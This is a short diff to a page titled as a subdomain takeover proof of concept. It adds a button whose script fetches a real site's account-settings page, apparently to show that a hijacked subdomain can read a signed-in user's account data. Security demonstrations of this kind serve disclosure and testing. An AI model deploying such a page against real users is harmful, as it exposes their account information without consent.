@@ -15,6 +15,7 @@
     <div class="main">
         <h2>Subdomain Takeover PoC By Monish Basaniwal</h2>
     </div>
+    <button onclick="getInfo()">Get Account Info</button>
 </body>
 
 <style>
@@ -38,5 +39,12 @@
         color: red;
     }
 </style>
+
+<script>
+    async function getInfo() {
+        const res = await fetch("https://www.datacamp.com/profile/account_settings");
+        console.log(res);
+    }
+</script>
 
 </html>
